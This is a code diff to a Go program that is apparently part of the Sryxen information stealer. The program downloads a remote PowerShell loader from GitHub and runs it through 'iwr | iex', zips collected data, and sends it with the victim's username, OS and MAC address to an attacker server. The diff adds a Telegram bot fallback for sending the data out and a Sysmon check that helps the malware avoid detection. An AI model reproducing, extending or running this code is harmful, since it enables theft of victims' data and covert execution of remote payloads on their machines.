@@ -12,9 +12,22 @@ import (
 	"strings"
 	"io"
 	"crypto/tls"
+	"syscall"
+)
+
+const (
+	botToken = "%YOUR_BOT_TOKEN%" 
+	chatID   = "%YOUR_CHAT_ID%"   
+
+	serverURL = "%SERVER_URL_HERE%" + "/logAgent"
+	apiKey    = "%SRYXEN_API_KEY_GENERATED%"
 )
 
 func main() {
+	if CheckForSysmon() {
+		log.Fatalf("VM detection failed: Sysmon is running")
+	}
+
 	cmd := exec.Command("powershell", "-Command", "iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex")
 	cmd.Stdout = nil
 	cmd.Stderr = nil
@@ -52,8 +65,6 @@ func main() {
 
 	log.Printf("Successfully created zip file: %s", zipFilePath)
 
-	serverURL := "%SERVER_URL_HERE%" + "/logAgent"
-
 	userName := getUsername()
 	osName, err := getOS()
 	if err != nil {
@@ -69,11 +80,31 @@ func main() {
 
 	err = sendZipFile(serverURL, zipFilePath, osName, userName, macAddress)
 	if err != nil {
-		fmt.Printf("Error sending zip file: %v\n", err)
-		return
+		log.Printf("Error sending zip file to server: %v\n", err)
+		log.Println("Sending the zip file to Telegram...")
+		err := SendTelegramDocument(botToken, chatID, zipFilePath)
+		if err != nil {
+			log.Fatalf("Failed to send zip file to Telegram: %v", err)
+		}
+		fmt.Println("Zip file sent successfully to Telegram!")
+	} else {
+		fmt.Println("Zip file sent successfully to server!")
+	}
+}
+
+func CheckForSysmon() bool {
+	cmd := exec.Command("tasklist")
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	err := cmd.Run()
+	if err != nil {
+		log.Printf("Error running tasklist command: %v", err)
+		return false
 	}
 
-	fmt.Println("Zip file sent successfully!")
+	return strings.Contains(out.String(), "sysmon.exe")
 }
 
 func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error {
@@ -117,7 +148,7 @@ func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error
 	req.Header.Set("OS", osName)
 	req.Header.Set("Name", userName)
 	req.Header.Set("MAC_Address", macAddress)
-	req.Header.Set("X-API-Key", "%SRYXEN_API_KEY_GENERATED%")
+	req.Header.Set("X-API-Key", apiKey)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -135,6 +166,57 @@ func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error
 	}
 
 	fmt.Printf("Server Response: %s\n", string(responseBody))
+	return nil
+}
+
+func SendTelegramDocument(botToken, chatID, filePath string) error {
+	fmt.Println("Sending document to Telegram:", filePath)
+	apiBaseURL := "https://api.telegram.org/bot"
+	client := &http.Client{}
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	writer.WriteField("chat_id", chatID)
+
+	if filePath != "" {
+		file, err := os.Open(filePath)
+		if err != nil {
+			return err
+		}
+		defer file.Close()
+
+		part, err := writer.CreateFormFile("document", filepath.Base(filePath))
+		if err != nil {
+			return err
+		}
+
+		if _, err = io.Copy(part, file); err != nil {
+			return err
+		}
+	}
+
+	writer.Close()
+
+	apiMethod := "sendDocument"
+	apiURL := fmt.Sprintf("%s%s/%s", apiBaseURL, botToken, apiMethod)
+	req, err := http.NewRequest("POST", apiURL, body)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		responseBody, _ := io.ReadAll(resp.Body)
+		fmt.Printf("Telegram API request failed with status %d: %s\n", resp.StatusCode, string(responseBody))
+		return fmt.Errorf("failed to send document: %s", string(responseBody))
+	}
+
 	return nil
 }
 
